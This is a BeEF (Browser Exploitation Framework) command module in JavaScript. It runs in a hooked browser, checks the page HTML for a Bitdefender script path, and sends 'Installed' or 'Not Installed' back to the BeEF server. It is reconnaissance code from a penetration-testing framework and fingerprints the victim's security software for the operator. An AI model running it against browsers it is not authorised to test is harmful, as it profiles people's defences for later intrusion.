//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
    var temp=document.body.innerHTML;
    var key="netdefender/hui/ndhui.js";
    if(temp.indexOf(key)>0) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'bitdefender=Installed');
    } else {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'bitdefender=Not Installed');
    };

});

